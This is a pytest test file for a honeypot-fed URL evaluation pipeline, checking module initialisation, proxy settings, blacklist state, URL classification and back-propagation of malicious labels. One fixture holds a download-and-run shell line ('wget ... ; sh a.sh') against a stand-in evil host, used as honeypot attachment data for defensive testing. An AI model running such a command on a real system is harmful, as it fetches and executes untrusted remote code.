"""Smoke tests: every bin/ script can be imported and initialised from a test config."""

import pytest

from tests.conftest import BIN_MODULES
from tests.factories import insert_url, insert_discovered


@pytest.mark.parametrize("name", BIN_MODULES)
def test_import_and_init(init_bin, config, name):
    module = init_bin(name)
    assert module.config is config
    assert module.logger is not None


def test_evaluator_init_sets_state(make_config, db, init_bin):
    ev = init_bin("evaluator", make_config(http_proxy="http://proxy.test:3128"))
    assert ev.db is db
    assert ev.proxies == {"http": "http://proxy.test:3128", "https": "http://proxy.test:3128"}
    assert ev.vt_minute_quota == 4 and ev.vt_minute_quota_cnt == 0
    assert ev.vt_daily_quota_exceeded is False
    assert ev.blacklist == [] and ev.bl_last_updated is None


def test_evaluator_init_resets_previous_state(evaluator_mod, init_bin):
    evaluator_mod.blacklist = ["http://evil.test/a.sh"]
    evaluator_mod.vt_daily_quota_exceeded = True
    ev = init_bin("evaluator")
    assert ev.blacklist == [] and ev.vt_daily_quota_exceeded is False


def test_activity_scanner_init_without_proxy(activity_scanner_mod):
    assert activity_scanner_mod.proxies == {}


def test_warden_init_compiles_sources(warden2evaluator_mod):
    event = {"Node": [{"Name": "cznic_haas"}]}
    assert warden2evaluator_mod.get_source_name(event) == "CZ.NIC HaaS"


def test_evaluator_process_url_stores_result(evaluator_mod, db):
    url = insert_url(db, "not a url")
    result = evaluator_mod.process_url(url)
    assert result["classification"] == "invalid"
    row = db.execute("SELECT classification, classification_reason, evaluated FROM urls WHERE url = ?", (url,)).fetchone()
    assert row == ("invalid", "Invalid format", "yes")
    history = db.execute("SELECT classification, actor FROM classification_history WHERE url = ?", (url,)).fetchall()
    assert history == [("invalid", "evaluator")]


def test_evaluator_process_url_back_propagates_malicious(evaluator_mod, db, monkeypatch):
    src = insert_url(db, "http://src.test/loader.sh")
    url = insert_url(db, "http://evil.test/a.sh")
    insert_discovered(db, url, src)
    monkeypatch.setattr(evaluator_mod, "evaluate_url", lambda u: dict(
        evaluated="yes", eval_later="no", classification="malicious", classification_reason="Blacklist check"))

    evaluator_mod.process_url(url)

    row = db.execute("SELECT classification, classification_reason FROM urls WHERE url = ?", (src,)).fetchone()
    assert row == ("malicious", "Downloading from malicious URL")
    actors = db.execute("SELECT actor FROM classification_history WHERE url = ?", (src,)).fetchall()
    assert actors == [("evaluator-backprop",)]


def test_warden_handle_events_inserts_urls(warden2evaluator_mod, db):
    event = {
        "ID": "idea-1",
        "DetectTime": "2026-01-01T10:00:00Z",
        "Node": [{"SW": ["hugo-cowrie"]}],
        "Attach": [{"Content": "wget http://evil.test/a.sh; sh a.sh"}],
    }
    inserted = warden2evaluator_mod.handle_events([event])
    assert inserted == ["http://evil.test/a.sh"]
    row = db.execute("SELECT honeynet, source FROM observations WHERE url = ?", (inserted[0],)).fetchone()
    assert row == ("CESNET Hugo", "Warden")


def test_classify_content_main_runs(config):
    from bin import classify_content
    classify_content.main(["--config", config._test_path])


def test_backfill_content_main_runs_on_empty_db(config):
    backfill_content = pytest.importorskip("bin.backfill_content", reason="bin/backfill_content.py is not tracked in git")
    backfill_content.main(["--config", config._test_path])
